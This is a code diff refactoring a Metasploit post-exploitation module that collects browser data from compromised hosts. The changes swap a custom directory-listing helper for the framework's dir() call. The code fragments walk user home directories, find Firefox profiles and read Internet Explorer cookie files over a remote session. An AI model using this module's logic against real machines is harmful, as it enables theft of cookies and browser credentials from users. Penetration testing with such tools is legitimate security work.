@@ -171,7 +171,7 @@ class Metasploit3 < Msf::Post
     user_profiles = []
     case session.platform
     when /unix|linux/
-      user_names = directory_entries("/home")
+      user_names = dir("/home")
       user_names.reject! { |u| %w(. ..).include?(u) }
       user_names.each do |user_name|
         user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
@@ -199,7 +199,7 @@ class Metasploit3 < Msf::Post
     found_dbs_paths = []
 
     files = []
-    files = directory_entries(path) if directory?(path)
+    files = dir(path) if directory?(path)
     files.each do |file_path|
       unless %w(. .. Shared).include?(file_path)
         found_dbs_paths.push([path, file_path].join(system_separator))
@@ -214,7 +214,7 @@ class Metasploit3 < Msf::Post
     found_dbs_paths = []
 
     if directory?(path)
-      files = directory_entries(path)
+      files = dir(path)
       files.reject! { |file| %w(. ..).include?(file) }
       files.each do |file_path|
         found_dbs_paths.push([path, file_path, 'prefs.js'].join(system_separator)) if file_path.match(/.*\.default/)
@@ -467,7 +467,7 @@ class Metasploit3 < Msf::Post
 
     browser_map.each_pair do |browser, lp_data|
       if browser == "IE"
-        cookies_files = directory_entries(lp_data['cookies_db'])
+        cookies_files = dir(lp_data['cookies_db'])
         cookies_files.reject! { |u| %w(. ..).include?(u) }
         cookies_files.each do |cookie_jar_file|
           data = read_remote_file(lp_data['cookies_db'] + system_separator + cookie_jar_file)
@@ -790,19 +790,5 @@ class Metasploit3 < Msf::Post
   # Returns OS separator in a session type agnostic way
   def system_separator
     return session.platform =~ /win/ ? '\\' : '/'
-  end
-
-  # Return directory content in a session type agnostic way
-  def directory_entries(path)
-    if directory?(path)
-      if session.type == "meterpreter"
-        return client.fs.dir.entries(path)
-      elsif session.type == "shell"
-        return session.shell_command("ls \"#{path}\"").split
-      else
-        print_error "Session type not recognized: #{session.type}"
-        return nil
-      end
-    end
   end
 end
